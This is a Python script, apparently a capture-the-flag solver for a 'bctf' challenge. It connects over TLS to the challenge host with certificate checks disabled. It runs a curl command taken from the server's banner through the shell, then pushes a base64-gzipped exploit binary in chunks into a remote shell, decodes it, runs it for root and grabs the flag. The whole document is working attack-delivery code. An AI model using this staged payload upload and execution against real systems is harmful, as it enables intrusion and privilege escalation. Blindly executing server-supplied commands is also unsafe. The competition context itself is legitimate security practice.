import subprocess, sys, time, socket, ssl, gzip, base64

with open('exploit_tiny', 'rb') as f:
    raw = f.read()
b64 = base64.b64encode(gzip.compress(raw, 9)).decode()
print(f'b64 len: {len(b64)}', flush=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection(('throughthewall.opus4-7.b01le.rs', 8443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname='throughthewall.opus4-7.b01le.rs')

def recv_until(pat, timeout=30):
    data = b''
    ssock.settimeout(timeout)
    while pat not in data:
        try:
            c = ssock.recv(4096)
            if not c: break
            data += c
        except socket.timeout: break
    return data

def sendline(s): ssock.sendall((s + '\n').encode())

initial = recv_until(b'solution:')
text = initial.decode(errors='replace')
challenge = None
for line in text.split('\n'):
    l = line.strip()
    if l.startswith('curl'): challenge = l; break
if challenge:
    result = subprocess.run(['sh', '-c', challenge], capture_output=True, text=True, timeout=120)
    sendline(result.stdout.strip())
recv_until(b'$ ', timeout=120)
print('[+] Got shell', flush=True)

# Upload in ~500 char chunks
CHUNK = 500
sendline("> /tmp/e.b64")
time.sleep(0.3)
recv_until(b'~ ', timeout=3)

for i in range(0, len(b64), CHUNK):
    chunk = b64[i:i+CHUNK]
    sendline("echo -n '" + chunk + "' >> /tmp/e.b64")
    time.sleep(0.1)
    if (i // CHUNK) % 4 == 3:
        recv_until(b'~ ', timeout=5)

time.sleep(1)
recv_until(b'~ ', timeout=10)

sendline('wc -c /tmp/e.b64')
time.sleep(0.5)
data = recv_until(b'~ ', timeout=5)
print('wc:', data.decode(errors='replace').strip(), flush=True)

sendline('base64 -d /tmp/e.b64 | gunzip > /tmp/e && chmod +x /tmp/e && ls -la /tmp/e')
time.sleep(1)
data = recv_until(b'~ ', timeout=10)
print(data.decode(errors='replace'), flush=True)

sendline('/tmp/e')
output = b''
start = time.time()
ssock.settimeout(10)
while time.time() - start < 120:
    try:
        chunk = ssock.recv(4096)
        if not chunk: break
        output += chunk
        sys.stdout.write(chunk.decode(errors='replace'))
        sys.stdout.flush()
        decoded = output.decode(errors='replace')
        if 'bctf{' in decoded and '}' in decoded or 'failed' in decoded or 'not found' in decoded or 'no heap' in decoded:
            break
        if 'ROOT' in decoded:
            time.sleep(3)
            try:
                c2 = ssock.recv(4096)
                output += c2
                sys.stdout.write(c2.decode(errors='replace'))
                sys.stdout.flush()
            except: pass
            break
    except socket.timeout: continue

decoded = output.decode(errors='replace')
for line in decoded.split('\n'):
    if 'bctf{' in line: print(f'\n[+] FLAG: {line.strip()}', flush=True)
ssock.close()
